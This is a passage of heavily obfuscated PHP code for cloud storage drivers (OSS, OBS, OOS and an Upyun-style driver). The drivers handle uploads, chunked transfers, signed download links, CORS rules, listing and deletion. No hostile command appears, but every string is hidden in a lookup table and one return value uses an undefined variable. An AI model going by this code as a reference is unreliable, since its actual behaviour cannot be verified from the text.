(is_string($¿šíæ°©)) { $®¬ºƒËæ[$¿šíæ°©] = array($É«¨Ûµ[79] => 0); } } return $this->listAllFiles($›î±£ñ¼, $®¬ºƒËæ); } public function canRead($—³£éÑ•) { return $this->exist($—³£éÑ•) ? !0 : !1; } public function canWrite($ïşÒĞÎö) { return $this->exist($ïşÒĞÎö) ? !0 : !1; } public function getContent($³¾¹·ü) { return $this->fileSubstr($³¾¹·ü, 0, -1); } public function setContent($Ñ€ïá£, $ìé©¢˜ = '') { $µ„±ä³  =& $_SERVER[«òÑğ]; if (!$ìé©¢˜) { $ˆé¿Îã = $this->ussRequest($Ñ€ïá£, $µ„±ä³ [291]); return $ˆé¿Îã[$µ„±ä³ [1307]]; } $‚–Ø²·È = $this->tempFile($this->pathThis($Ñ€ïá£)); file_put_contents($‚–Ø²·È, $ìé©¢˜); if ($this->upload($Ñ€ïá£, $‚–Ø²·È)) { $this->tempFileRemve($‚–Ø²·È); return !0; } return !1; } public function fileSubstr($¢»©½øß, $ö–»†ï÷, $•¯ˆõ¨ö) { $¬“‘¸×í =& $_SERVER[«òÑğ]; if (!($çïÀ‰€· = $this->link($¢»©½øß))) { return !1; } $ôÌ¾ÂÜö = !1; if ($•¯ˆõ¨ö > 0) { $Á¤Úˆç = $ö–»†ï÷ + $•¯ˆõ¨ö - 1; $ôÌ¾ÂÜö = array($¬“‘¸×í[1547] . $ö–»†ï÷ . $¬“‘¸×í[465] . $Á¤Úˆç); } $‘‚÷©©œ = url_request($çïÀ‰€·, $¬“‘¸×í[1507], !1, $ôÌ¾ÂÜö); return $‘‚÷©©œ[$¬“‘¸×í[834]] ? $‘‚÷©©œ[$¬“‘¸×í[1297]] : !1; } public function upload($Ÿ•ÉÛ¯, $…õ®õı÷, $¡Öú©â× = false, $†ƒ½”¼Í = REPEAT_REPLACE) { $«Êå½Š =& $_SERVER[«òÑğ]; $•ì¢”çù = IO::size($…õ®õı÷); if ($•ì¢”çù <= 1024 * 1024 * 200) { $ïäâ¢£Â = array($«Êå½Š[1589] . $…õ®õı÷); $æñ£Ê¢³ = $this->ussRequest($Ÿ•ÉÛ¯, $«Êå½Š[256], $ïäâ¢£Â); return $æñ£Ê¢³[$«Êå½Š[1307]] ? $this->getPathOuter($Ÿ•ÉÛ¯) : !1; } $ûÃ¬Ã¹ğ = 1024 * 1024 * 10; $”ÆŠÜ‚¥ = array($«Êå½Š[1590], $«Êå½Š[1591] . $•ì¢”çù, $«Êå½Š[1592], $«Êå½Š[1593] . $ûÃ¬Ã¹ğ); $æñ£Ê¢³ = $this->ussRequest($Ÿ•ÉÛ¯, $«Êå½Š[256], !1, $”ÆŠÜ‚¥); if (!$æñ£Ê¢³[$«Êå½Š[1307]]) { return !1; } $ŒÔªŠ°ò = $æñ£Ê¢³[$«Êå½Š[1297]]; $úÀ‘ı = 0; $ÕÚıùÉ× = $ŒÔªŠ°ò[$«Êå½Š[1594]]; $â ÀÃ“² = fopen($…õ®õı÷, $«Êå½Š[1470]); if (!$â ÀÃ“²) { return !1; } do { $äš«ÙÖÜ = $ŒÔªŠ°ò[$«Êå½Š[1595]]; fseek_64($â ÀÃ“², $úÀ‘ı); $€ıÈÖŞ = fread($â ÀÃ“², $äš«ÙÖÜ); $í¢Œª‡Ô = 0; do { $í¢Œª‡Ô++; $ŒÔªŠ°ò = $this->uploadPart($Ÿ•ÉÛ¯, $ŒÔªŠ°ò, $€ıÈÖŞ); } while (!$ŒÔªŠ°ò && $í¢Œª‡Ô < 3); if (!$ŒÔªŠ°ò) { return !1; } $ÕÚıùÉ× = $ŒÔªŠ°ò[$«Êå½Š[1594]]; $úÀ‘ı += $äš«ÙÖÜ; } while ($ÕÚıùÉ× != -1); fclose($â ÀÃ“²); $”ÆŠÜ‚¥ = array($«Êå½Š[1596], $«Êå½Š[1597] . $ŒÔªŠ°ò[$«Êå½Š[1598]], $«Êå½Š[1592]); $æñ£Ê¢³ = $this->ussRequest($Ÿ•ÉÛ¯, $«Êå½Š[256], !1, $”ÆŠÜ‚¥); return $æñ£Ê¢³[$«Êå½Š[1307]] ? $this->getPathOuter($í²àéÈß) : !1; } private function uploadPart($í†Ó’˜í, $¼ù¡Ñï´, &$ó…ĞŒ Û) { $©«Ëãù€ =& $_SERVER[«òÑğ]; $ÈåÅ¢¬û = array($©«Ëãù€[1599], $©«Ëãù€[1597] . $¼ù¡Ñï´[$©«Ëãù€[1598]], $©«Ëãù€[1600] . $¼ù¡Ñï´[$©«Ëãù€[1594]], $©«Ëãù€[146] . $¼ù¡Ñï´[$©«Ëãù€[1595]]); $Ô€¹ì³À = $this->ussRequest($í†Ó’˜í, $©«Ëãù€[256], $ó…ĞŒ Û, $ÈåÅ¢¬û); return !$Ô€¹ì³À[$©«Ëãù€[1307]] ? $Ô€¹ì³À[$©«Ëãù€[1307]] : $Ô€¹ì³À[$©«Ëãù€[1297]]; } public function uploadFormData($‡³ıìÙ, $ÓË‚½Õ’ = 3600) { return $this->uploadPolicy($‡³ıìÙ, $ÓË‚½Õ’); } public function uploadMultiData($µ—ÓÇËá, $Øº²³÷ = 3600) { $ÅÎÇº•ä =& $_SERVER[«òÑğ]; $×¶Ì¡ = (int) $GLOBALS[$ÅÎÇº•ä[7]][$ÅÎÇº•ä[79]]; return $this->uploadPolicy($µ—ÓÇËá, $Øº²³÷, $×¶Ì¡); } private function uploadPolicy($ç’‚½†¤, $«í€¯Òê = 3600, $á¶æáú‘ = 0) { $·€‚‰ğ¬ =& $_SERVER[«òÑğ]; $Õ‰ˆ¯Œ¹ = $·€‚‰ğ¬[8] . $this->bucket; $ì”ûÑÁİ = gmdate($·€‚‰ğ¬[1505]); $¿ÅßèÎá = array($·€‚‰ğ¬[1601] => $this->bucket, $·€‚‰ğ¬[1602] => $ç’‚½†¤, $·€‚‰ğ¬[1603] => time() + $«í€¯Òê, $·€‚‰ğ¬[1604] => $ì”ûÑÁİ); if ($á¶æáú‘) { $¿ÅßèÎá[$·€‚‰ğ¬[1490]] = $á¶æáú‘; } $ı’›ˆÀ = base64_encode(json_encode($¿ÅßèÎá)); $Õ®îº¸‹ = base64_encode(hash_hmac($·€‚‰ğ¬[1558], "\120\117\123\124\46{$Õ‰ˆ¯Œ¹}\46{$ì”ûÑÁİ}\46{$ı’›ˆÀ}", md5("{$this->userpass}"), !0)); $«ãşÄïä = array($·€‚‰ğ¬[280] => $ı’›ˆÀ, $·€‚‰ğ¬[1605] => "\125\x50\131\x55\116\x20{$this->username}\x3a{$Õ®îº¸‹}", $·€‚‰ğ¬[209] => $this->endpoint . $Õ‰ˆ¯Œ¹); return $«ãşÄïä; } public function download($­ãÎ—‹, $‰ûŞ‚ˆ½) { $ÌÃÅŸ = IO::getPathInner(IO::mkfile($‰ûŞ‚ˆ½)); if (!($âöÚ®Ô = $this->link($­ãÎ—‹))) { return !1; } $ĞÃ¬¾ßÉ = 0; $æÆ÷Œóç = 1024 * 200; $¤¢º€øâ = fopen($ÌÃÅŸ, $_SERVER[«òÑğ][1553]); while (!0) { $‘ĞµÄÊÜ = $this->fileSubstr($­ãÎ—‹, $ĞÃ¬¾ßÉ, $æÆ÷Œóç); if ($‘ĞµÄÊÜ === !1) { return !1; } fwrite($¤¢º€øâ, $‘ĞµÄÊÜ); $ĞÃ¬¾ßÉ += $æÆ÷Œóç; if (strlen($‘ĞµÄÊÜ) < $æÆ÷Œóç) { break; } } fclose($¤¢º€øâ); return $‰ûŞ‚ˆ½; } public function link($î…éï™, $¢Êç¢… = array()) { $±ÅùèÕ½ =& $_SERVER[«òÑğ]; $î…éï™ = trim($î…éï™, $±ÅùèÕ½[8]); if (!empty($this->token)) { $´ĞùÓ’ = strtotime(date($±ÅùèÕ½[1606])); $ÎåÍÃá = substr(md5($this->token . $±ÅùèÕ½[287] . $´ĞùÓ’ . $±ÅùèÕ½[1607] . $î…éï™), 12, 8) . $´ĞùÓ’; $¢Êç¢…[] = $±ÅùèÕ½[1608] . $ÎåÍÃá; } $üÓÙ‡Ï = !empty($¢Êç¢…) ? $±ÅùèÕ½[76] . implode($±ÅùèÕ½[287], $¢Êç¢…) : $±ÅùèÕ½[12]; return $this->getHost() . $±ÅùèÕ½[8] . $this->pathEncode($î…éï™) . $üÓÙ‡Ï; } public function fileOut($Á“óÚî, $‚â¾š¨ = false, $öşìôïÒ = false, $Œ½‚š‚ı = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Á“óÚî, $‚â¾š¨, $öşìôïÒ, $Œ½‚š‚ı); } if (!$öşìôïÒ) { $öşìôïÒ = $this->pathThis($Á“óÚî); } $ĞÜãÖ–Ñ = $‚â¾š¨ ? array($_SERVER[«òÑğ][1609] . rawurlencode($öşìôïÒ)) : array(); $½àå­ÏÀ = $this->link($Á“óÚî, $ĞÜãÖ–Ñ); $this->fileOutLink($½àå­ÏÀ); } public function fileOutServer($®íÆüæ, $Û–é† = false, $Ê©±ñÃ¿ = false, $´‹ƒù×‘ = '') { parent::fileOut($®íÆüæ, $Û–é†, $Ê©±ñÃ¿, $´‹ƒù×‘); } public function fileOutImage($·µ¥ó, $´»ªû±å = 250) { $ƒçèÌª‚ = $this->link($·µ¥ó . $_SERVER[«òÑğ][1610] . $´»ªû±å); $this->fileOutLink($ƒçèÌª‚); } public function fileOutImageServer($ÇÎº‹ÖÍ, $Ï§ıÃÉª = 250) { parent::fileOutImage($ÇÎº‹ÖÍ, $Ï§ıÃÉª); } public function hashMd5($ªÇ¶ï”È) { $½˜¶¸ú =& $_SERVER[«òÑğ]; $ÃŠ’íÏ = $this->_objectMeta($ªÇ¶ï”È); return isset($ÃŠ’íÏ[$½˜¶¸ú[248]]) ? $ÃŠ’íÏ[$½˜¶¸ú[248]] : !1; } public function size($ñÕ£•ö) { $Ûá§¯Å = $this->objectMeta($ñÕ£•ö); return $Ûá§¯Å ? $Ûá§¯Å[$_SERVER[«òÑğ][79]] : 0; } public function info($˜Åëø¹ë) { if ($this->isFolder($˜Åëø¹ë)) { return $this->folderInfo($˜Åëø¹ë); } else { if ($this->isFile($˜Åëø¹ë)) { return $this->fileInfo($˜Åëø¹ë); } } return !1; } public function exist($¤º·Ë²Ô) { return $this->isFile($¤º·Ë²Ô) || $this->isFolder($¤º·Ë²Ô); } public function isFile($Çõßºä) { return !$this->isFolder($Çõßºä) && $this->objectMeta($Çõßºä); } public function isFolder($æÛÃ©§Ú) { return $this->cacheMethod($_SERVER[«òÑğ][180], $æÛÃ©§Ú); } protected function objectMeta($Ú“çÄ½±) { return $this->cacheMethod($_SERVER[«òÑğ][182], $Ú“çÄ½±); } protected function _objectMeta($ûûªÉ­ì) { $óºÒ Áş =& $_SERVER[«òÑğ]; if ($ûûªÉ­ì == $óºÒ Áş[12] || $ûûªÉ­ì == $óºÒ Áş[8]) { return array(); } $ãÍêåƒ = $this->ussRequest($ûûªÉ­ì, $óºÒ Áş[1611]); if (!$ãÍêåƒ[$óºÒ Áş[1307]]) { return null; } $°”İŞü = isset($ãÍêåƒ[$óºÒ Áş[1297]]) ? $ãÍêåƒ[$óºÒ Áş[1297]] : array(); if (!isset($°”İŞü[$óºÒ Áş[1612]])) { return null; } $ŞÍª© = array($óºÒ Áş[33] => isset($°”İŞü[$óºÒ Áş[1612]]) ? $°”İŞü[$óºÒ Áş[1612]] : null, $óºÒ Áş[79] => isset($°”İŞü[$óºÒ Áş[1613]]) ? $°”İŞü[$óºÒ Áş[1613]] : null, $óºÒ Áş[248] => isset($°”İŞü[$óºÒ Áş[1614]]) ? $°”İŞü[$óºÒ Áş[1614]] : null, $óºÒ Áş[1581] => isset($°”İŞü[$óºÒ Áş[1615]]) ? $°”İŞü[$óºÒ Áş[1615]] : null); $ŞÍª©[$óºÒ Áş[1582]] = isset($°”İŞü[$óºÒ Áş[1616]]) ? strtotime($°”İŞü[$óºÒ Áş[1616]]) : $ŞÍª©[$óºÒ Áş[1581]]; return $ŞÍª©; } protected function _isFolder($úôªÌĞ’) { $®ê°ª‹ =& $_SERVER[«òÑğ]; if ($úôªÌĞ’ == $®ê°ª‹[12] || $úôªÌĞ’ == $®ê°ª‹[8]) { return !0; } $´ÁİŞ·› = $this->_objectMeta($úôªÌĞ’); return isset($´ÁİŞ·›[$®ê°ª‹[33]]) && $´ÁİŞ·›[$®ê°ª‹[33]] == $®ê°ª‹[78] ? !0 : !1; } } goto c‘¡÷ª­¶¨; CÊÆªÛæ¼Î: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($×üÎÛ‘İ) { parent::__construct($×üÎÛ‘İ); $this->setSignVersion($_SERVER[«òÑğ][250]); } public function fileOutImage($áŞÓ»Ğ¼, $ÈùÍÑÉÀ = 250) { $â¢’ğè® =& $_SERVER[«òÑğ]; if ($this->size($áŞÓ»Ğ¼) > 1024 * 1024 * 25) { return $this->fileOutImageServer($áŞÓ»Ğ¼, $ÈùÍÑÉÀ); } $ºí•úõù = array($â¢’ğè®[1471] => $â¢’ğè®[1472] . $ÈùÍÑÉÀ . $â¢’ğè®[1473]); $ä®ì„¯¿ = $this->link($áŞÓ»Ğ¼, $ºí•úõù); $this->fileOutLink($ä®ì„¯¿); } public function fileOutLink($„‹‹» ¼) { $Ô‰­‡Å× =& $_SERVER[«òÑğ]; if (substr($„‹‹» ¼, 0, 7) == $Ô‰­‡Å×[219]) { $„‹‹» ¼ = $Ô‰­‡Å×[220] . substr($„‹‹» ¼, 7); } header($Ô‰­‡Å×[175] . $„‹‹» ¼); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($û¹µâÛ¹) { parent::__construct($û¹µâÛ¹); $this->setSignVersion($_SERVER[«òÑğ][250]); } public function fileOutLink($ŞšßÜš¨) { $Øãîğİ =& $_SERVER[«òÑğ]; if (substr($ŞšßÜš¨, 0, 7) == $Øãîğİ[219]) { $ŞšßÜš¨ = $Øãîğİ[220] . substr($ŞšßÜš¨, 7); } header($Øãîğİ[175] . $ŞšßÜš¨); die; } public function uploadFormData($ß§¢†œ, $ùÁ ˆÑú = 3600) { return $this->uploadFormDataV2($ß§¢†œ, $ùÁ ˆÑú); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ÚÀ©ÙÒ„) { parent::__construct(); include_once SDK_DIR . $_SERVER[«òÑğ][1474]; $this->_init($ÚÀ©ÙÒ„); } public function _init($‹Ô™ˆŞ­) { $–€ÆÉ =& $_SERVER[«òÑğ]; $this->config = $‹Ô™ˆŞ­; foreach ($‹Ô™ˆŞ­ as $¦şÉØÄ³ => $×ú‡®˜¼) { if (isset($this->{$¦şÉØÄ³})) { $this->{$¦şÉØÄ³} = $×ú‡®˜¼; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($–€ÆÉ[1475] . LNG($–€ÆÉ[1476])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $‰¤¥Ù =& $_SERVER[«òÑğ]; $”ÄÃ¨¶Í = new OSS\Model\CorsConfig(); $ÈéñÆŞ· = new OSS\Model\CorsRule(); $ÈéñÆŞ·->addAllowedOrigin($‰¤¥Ù[1477]); $ÈéñÆŞ·->addAllowedMethod($‰¤¥Ù[1478]); $ÈéñÆŞ·->addAllowedMethod($‰¤¥Ù[1479]); $ÈéñÆŞ·->addAllowedMethod($‰¤¥Ù[1480]); $ÈéñÆŞ·->addAllowedMethod($‰¤¥Ù[1481]); $ÈéñÆŞ·->addAllowedMethod($‰¤¥Ù[165]); $ÈéñÆŞ·->setMaxAgeSeconds(600); $ÈéñÆŞ·->addExposeHeader($‰¤¥Ù[1482]); $ÈéñÆŞ·->addAllowedHeader($‰¤¥Ù[1477]); $”ÄÃ¨¶Í->addRule($ÈéñÆŞ·); try { $this->client->putBucketCors($this->bucket, $”ÄÃ¨¶Í); } catch (OSS\Core\OssException $î×ÊÄ•) { $this->writeLog(__FUNCTION__ . $‰¤¥Ù[215] . $î×ÊÄ•->getMessage()); return !1; } return !0; } public function getBucketCors() { $ğµ¤À¯µ =& $_SERVER[«òÑğ]; $æÏ¡¿‹ = null; try { $æÏ¡¿‹ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ãµâù—) { $this->writeLog(__FUNCTION__ . $ğµ¤À¯µ[215] . $Ãµâù—->getMessage()); return null; } if (!$æÏ¡¿‹ || !($¡ğ©¶‘Ş = $æÏ¡¿‹->getRules())) { return null; } $™œª×¨™ = $¡ğ©¶‘Ş[0]->getAllowedOrigins(); $øˆèã­ = $¡ğ©¶‘Ş[0]->getAllowedMethods(); $ÇøˆğÀÚ = $¡ğ©¶‘Ş[0]->getMaxAgeSeconds(); $ÁŠˆ‚Î¡ = $¡ğ©¶‘Ş[0]->getExposeHeaders(); $¶‘± Æ¸ = $¡ğ©¶‘Ş[0]->getAllowedHeaders(); return array($ğµ¤À¯µ[221] => isset($™œª×¨™[0]) ? $™œª×¨™[0] : $ğµ¤À¯µ[12], $ğµ¤À¯µ[225] => $øˆèã­, $ğµ¤À¯µ[1483] => $ÇøˆğÀÚ, $ğµ¤À¯µ[1484] => isset($ÁŠˆ‚Î¡[0]) ? $ÁŠˆ‚Î¡[0] : $ğµ¤À¯µ[12], $ğµ¤À¯µ[222] => isset($¶‘± Æ¸[0]) ? $¶‘± Æ¸[0] : $ğµ¤À¯µ[12]); } public function isBucketCors() { $œíğÌÎ¹ =& $_SERVER[«òÑğ]; $‰ú…¿Ë¾ = $this->getBucketCors(); if (!$‰ú…¿Ë¾ || !is_array($‰ú…¿Ë¾)) { return !1; } if ($‰ú…¿Ë¾[$œíğÌÎ¹[221]] != $œíğÌÎ¹[223] || $‰ú…¿Ë¾[$œíğÌÎ¹[222]] != $œíğÌÎ¹[223]) { return !1; } $ø¡ôÕ² = array_map($œíğÌÎ¹[224], $‰ú…¿Ë¾[$œíğÌÎ¹[225]]); if (!is_array($ø¡ôÕ²)) { $ø¡ôÕ² = array(); } $°ûè‰Êâ = array($œíğÌÎ¹[226], $œíğÌÎ¹[227], $œíğÌÎ¹[228], $œíğÌÎ¹[229], $œíğÌÎ¹[230]); $ı¹½ÙïÜ = array_diff($°ûè‰Êâ, $ø¡ôÕ²); return empty($ı¹½ÙïÜ); } public function mkfile($İ˜ùÅ®÷, $á’¡ÎÃ = '', $‘“ş”š = REPEAT_RENAME) { $€ê©Ê±Ï = $this->setContent($İ˜ùÅ®÷, $á’¡ÎÃ); if ($€ê©Ê±Ï !== !1) { return $this->getPathOuter($İ˜ùÅ®÷); } return !1; } public function mkdir($œÏ‘Õ¸í, $îì„¥ä = REPEAT_SKIP) { if ($îì„¥ä && $this->_isFolder($œÏ‘Õ¸í)) { return $this->getPathOuter($œÏ‘Õ¸í); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($œÏ‘Õ¸í)); } catch (OSS\Core\OssException $õò­ˆ) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][215] . $õò­ˆ->getMessage()); return !1; } return $this->getPathOuter($œÏ‘Õ¸í); } private function fileList($¶´óçŸƒ, $ã™Û¶Ñ = '', $±§¸Ìñ = 0) { $¦”ƒÛ›ü =& $_SERVER[«òÑğ]; $¶´óçŸƒ = trim($¶´óçŸƒ, $¦”ƒÛ›ü[8]); $›“èàÒË = empty($¶´óçŸƒ) && $¶´óçŸƒ !== $¦”ƒÛ›ü[231] ? $¦”ƒÛ›ü[12] : $¶´óçŸƒ . $¦”ƒÛ›ü[8]; $¨ˆŒ­°Ò = $¦”ƒÛ›ü[12]; $¿ÁÍ‡ì = 1000; $´º–˜Úâ = $¤´ıâ‘‘ = array(); while (!0) { check_abort(); $Ü‡ºƒ = array($¦”ƒÛ›ü[1485] => $ã™Û¶Ñ, $¦”ƒÛ›ü[1486] => $›“èàÒË, $¦”ƒÛ›ü[1487] => $¿ÁÍ‡ì, $¦”ƒÛ›ü[1488] => $¨ˆŒ­°Ò); try { $Óì³¯ = $this->client->listObjects($this->bucket, $Ü‡ºƒ); } catch (OSS\Core\OssException $¯áòç£î) { $this->writeLog(__FUNCTION__ . $¦”ƒÛ›ü[215] . $¯áòç£î->getMessage()); break; } $¨ˆŒ­°Ò = $Óì³¯->getNextMarker(); $¤œŠçÃÁ = $Óì³¯->getObjectList(); $È÷ç‚Î = $Óì³¯->getPrefixList(); foreach ($¤œŠçÃÁ as $åÑÑÙËï) { if ($åÑÑÙËï->getKey() == $›“èàÒË) { continue; } $±ŒÉñÁº = $åÑÑÙËï->getKey(); $šìÚ›¸á = $åÑÑÙËï->getSize(); $íèØõÎ¨ = $åÑÑÙËï->getLastModified(); $Äœ²€œ¨ = trim($åÑÑÙËï->getETag(), $¦”ƒÛ›ü[121]); $ÍÜ‘»ß‹ = $±§¸Ìñ ? array($¦”ƒÛ›ü[32] => $±ŒÉñÁº, $¦”ƒÛ›ü[79] => $šìÚ›¸á, $¦”ƒÛ›ü[207] => strtotime($íèØõÎ¨), $¦”ƒÛ›ü[1489] => $Äœ²€œ¨) : $±ŒÉñÁº; $‡„±ÙË = $šìÚ›¸á == 0 && substr($±ŒÉñÁº, strlen($±ŒÉñÁº) - 1, 1) == $¦”ƒÛ›ü[8] ? !0 : !1; $œÜ‹õßê = array($¦”ƒÛ›ü[79] => $šìÚ›¸á, $¦”ƒÛ›ü[1490] => $šìÚ›¸á, $¦”ƒÛ›ü[88] => strtotime($íèØõÎ¨), $¦”ƒÛ›ü[1491] => $íèØõÎ¨, $¦”ƒÛ›ü[1489] => $Äœ²€œ¨); $this->cacheMethodInfoSet($±ŒÉñÁº, $‡„±ÙË, $œÜ‹õßê); if ($‡„±ÙË) { $´º–˜Úâ[] = $±ŒÉñÁº; continue; } $¤´ıâ‘‘[] = $ÍÜ‘»ß‹; } foreach ($È÷ç‚Î as $ş«êç”’) { $´º–˜Úâ[] = $ş«êç”’->getPrefix(); $this->cacheMethodInfoSet($ş«êç”’->getPrefix(), !0); } if ($¨ˆŒ­°Ò === $¦”ƒÛ›ü[12]) { break; } } $this->cacheMethodInfoSet($¶´óçŸƒ, !0); return array($¦”ƒÛ›ü[85] => $´º–˜Úâ, $¦”ƒÛ›ü[86] => $¤´ıâ‘‘); } public function listObject($æ‰¬³Ÿ·, $ã¢ğÃ€ = '') { $¥Ö×ºîè =& $_SERVER[«òÑğ]; $æ‰¬³Ÿ· = trim($æ‰¬³Ÿ·, $¥Ö×ºîè[8]); $‹Üµí¦Ó = empty($æ‰¬³Ÿ·) && $æ‰¬³Ÿ· !== $¥Ö×ºîè[231] ? $¥Ö×ºîè[12] : $æ‰¬³Ÿ· . $¥Ö×ºîè[8]; $‹´·–õÛ = $¥Ö×ºîè[12]; $Úî±İÁ = 1000; $Ó¦ò… = $Ï©ğ‰šÚ = array(); while (!0) { check_abort(); $²Í´ÉÖÆ = array($¥Ö×ºîè[1485] => $ã¢ğÃ€, $¥Ö×ºîè[1486] => $‹Üµí¦Ó, $¥Ö×ºîè[1487] => $Úî±İÁ, $¥Ö×ºîè[1488] => $‹´·–õÛ); try { $ôöÈ‰º = $this->client->listObjects($this->bucket, $²Í´ÉÖÆ); } catch (OSS\Core\OssException $™´ØÄâñ) { $this->writeLog(__FUNCTION__ . $¥Ö×ºîè[215] . $™´ØÄâñ->getMessage()); break; } $‹´·–õÛ = $ôöÈ‰º->getNextMarker(); $ÕÁôó = $ôöÈ‰º->getObjectList(); foreach ($ÕÁôó as $öœ£•“­) { if ($öœ£•“­->getKey() == $‹Üµí¦Ó) { continue; } $°¸ñÜÁ› = $öœ£•“­->getKey(); $ÅÂ²Ó’ = $öœ£•“­->getSize(); $ğ¯›‰ë = $ÅÂ²Ó’ == 0 && substr($°¸ñÜÁ›, strlen($°¸ñÜÁ›) - 1, 1) == $¥Ö×ºîè[8] ? !0 : !1; if ($ğ¯›‰ë) { continue; } $Ï©ğ‰šÚ[] = $ÅÂ²Ó’ . $¥Ö×ºîè[215] . $°¸ñÜÁ›; } if ($‹´·–õÛ === $¥Ö×ºîè[12]) { break; } } return array($¥Ö×ºîè[85] => $Ó¦ò…, $¥Ö×ºîè[86] => $Ï©ğ‰šÚ); } public function copyFile($“½ı¢ÒŒ, $Ò·´§õÀ) { $±È¯ˆ¼ = $this->size($“½ı¢ÒŒ); if ($±È¯ˆ¼ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $“½ı¢ÒŒ, $this->bucket, $this->pathEncode($Ò·´§õÀ)); } catch (OSS\Core\OssException $íš×Àï«) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][215] . $íš×Àï«->getMessage()); return !1; } return $this->getPathOuter($Ò·´§õÀ); } $ÑÜº·şÄ = $this->multiCopyObject($“½ı¢ÒŒ, $Ò·´§õÀ, $±È¯ˆ¼); return $ÑÜº·şÄ ? $this->getPathOuter($Ò·´§õÀ) : !1; } private function multiCopyObject($ê¦Ôôà, $Äê²ıÖ, $ùà¤š) { $é¥ Ù§ß =& $_SERVER[«òÑğ]; try { $ÈÅÈÔ¾« = array(); if ($ãÒ‡ÙßÚ = $this->hashMd5($ê¦Ôôà)) { $ÈÅÈÔ¾« = array(OSS\OssClient::OSS_HEADERS => array($é¥ Ù§ß[1492] => $ãÒ‡ÙßÚ)); } $ŞÊêæ¶¡ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Äê²ıÖ), $ÈÅÈÔ¾«); $ò•óßÆ¾ = 1; $ãøÇå = 0; $Áµø¶ÙÒ = array(); $±îÚ”œ¦ = 1024 * 1024 * 10; $‘†ÈÉš¹ = $this->client->generateMultiuploadParts($ùà¤š, $±îÚ”œ¦); foreach ($‘†ÈÉš¹ as $‹Ò¾ê×¢ => $¥ıú“È) { $÷³ŒÂ‡è = $ãøÇå + (int) $¥ıú“È[$é¥ Ù§ß[1493]]; $ë£ŸÈĞô = (int) $¥ıú“È[$é¥ Ù§ß[415]] + $÷³ŒÂ‡è - 1; $İÈ¿¢æÄ = array($é¥ Ù§ß[167] => $÷³ŒÂ‡è, $é¥ Ù§ß[168] => $ë£ŸÈĞô); $Áµø¶ÙÒ[] = $this->client->uploadPartCopy($this->bucket, $ê¦Ôôà, $this->bucket, $this->pathEncode($Äê²ıÖ), $ò•óßÆ¾, $ŞÊêæ¶¡, $İÈ¿¢æÄ); $ò•óßÆ¾ = $ò•óßÆ¾ + 1; } $¥·ÜñÛñ = array(); foreach ($Áµø¶ÙÒ as $‹Ò¾ê×¢ => $Ÿ²ÏÆüË) { $¥·ÜñÛñ[] = array($é¥ Ù§ß[300] => $‹Ò¾ê×¢ + 1, $é¥ Ù§ß[301] => $Ÿ²ÏÆüË); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Äê²ıÖ), $ŞÊêæ¶¡, $¥·ÜñÛñ); } catch (OSS\Core\OssException $„Ğ´¿óã) { $this->writeLog(__FUNCTION__ . $é¥ Ù§ß[215] . $„Ğ´¿óã->getMessage()); return !1; } return !0; } public function moveFile($®£æ—İ¡, $›á›÷û) { if ($this->copyFile($®£æ—İ¡, $›á›÷û)) { $this->remove($®£æ—İ¡); return $this->getPathOuter($›á›÷û); } return !1; } public function delFile($¼áŠ¸ë) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¼áŠ¸ë)); } catch (OSS\Core\OssException $Ñ–»˜ş») { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][215] . $Ñ–»˜ş»->getMessage()); return !1; } return !0; } public function delFolder($è¥áîÊ†) { $ÔÒ’çğ =& $_SERVER[«òÑğ]; if (!$this->exist($è¥áîÊ†)) { return !0; } $this->listItemCache = !1; $öÈïÉÀ› = $this->fileList($è¥áîÊ†); $this->listItemCache = !0; $Æ¯Ğ¬Ñ = trim($è¥áîÊ†, $ÔÒ’çğ[8]) . $ÔÒ’çğ[8]; if (!empty($è¥áîÊ†) && $è¥áîÊ† !== $ÔÒ’çğ[231] && !in_array($Æ¯Ğ¬Ñ, $öÈïÉÀ›[$ÔÒ’çğ[85]])) { $öÈïÉÀ›[$ÔÒ’çğ[85]][] = $Æ¯Ğ¬Ñ; } $µºÎò´ = $this->delByBatch($öÈïÉÀ›[$ÔÒ’çğ[86]]); if (!$µºÎò´) { return !1; } $µºÎò´ = $this->delByBatch($öÈïÉÀ›[$ÔÒ’çğ[85]]); if (!$µºÎò´) { return !1; } return $this->delFile($Æ¯Ğ¬Ñ); } private function delByBatch($êıÓûÓ‰) { foreach (array_chunk($êıÓûÓ‰, 1000) as $–ù©¹Ãä) { try { $this->client->deleteObjects($this->bucket, $–ù©¹Ãä); } catch (OSS\Core\OssException $ë§®„êé) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][215] . $ë§®„êé->getMessage()); return !1; } } return !0; } public function rename($¾½ı¯œç, $ò©•ËÙ’) { return $this->renameObject($¾½ı¯œç, $ò©•ËÙ’); } private function fileInfo($ÒÎñ‚—ß, $úïˆæßÛ = false, $²šô‰ÙÃ = array()) { $¤Ìç¡Ğœ =& $_SERVER[«òÑğ]; $·×†Åéù = array($¤Ìç¡Ğœ[32] => $this->pathThis($ÒÎñ‚—ß), $¤Ìç¡Ğœ[87] => $this->getPathOuter($ÒÎñ‚—ß), $¤Ìç¡Ğœ[33] => $¤Ìç¡Ğœ[233], $¤Ìç¡Ğœ[79] => isset($²šô‰ÙÃ[$¤Ìç¡Ğœ[79]]) ? $²šô‰ÙÃ[$¤Ìç¡Ğœ[79]] : 0, $¤Ìç¡Ğœ[169] => $this->ext($ÒÎñ‚—ß)); if ($úïˆæßÛ) { return $·×†Åéù; } 